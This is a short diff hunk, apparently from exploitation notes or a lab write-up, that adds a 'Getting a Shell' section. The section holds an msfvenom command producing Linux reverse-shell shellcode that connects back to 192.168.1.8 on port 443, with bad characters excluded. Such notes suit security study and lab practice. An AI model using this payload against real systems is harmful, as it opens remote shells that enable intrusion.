@@ -235,5 +235,9 @@ except Exception as e:
 dmesg | grep NX
 ```
 
+## Getting a Shell
 
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.8 LPORT=443 -b "\x00\x20" -f py -v shellcode
+```
 
